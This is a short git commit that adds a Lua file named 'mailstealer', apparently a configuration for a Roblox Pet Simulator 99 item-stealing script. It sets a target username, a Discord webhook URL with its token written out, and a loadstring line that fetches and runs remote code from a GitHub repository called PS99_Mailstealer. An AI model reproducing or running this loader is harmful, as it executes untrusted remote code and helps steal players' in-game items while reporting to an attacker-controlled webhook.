ca5bd32d24a20bed84d06ed226a23a37d8b4d9ca
Xerjon <estiocoxerjonzeus@gmail.com>
2024-05-18 10:45:50 +0800

    Add files via upload

---
+++ mailstealer .lua
@@ -0,0 +1,5 @@
+Username = "binengpogi"
+LoadScreen = diamond hunter
+Webhook = "https://discord.com/api/webhooks/1240942704548909129/vq6abtnfD8CMvHiMOcGapryHbHM6aRu6a_5lXriDTvcsoYftmnO7TXqV-zCyL54kO-Bl"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
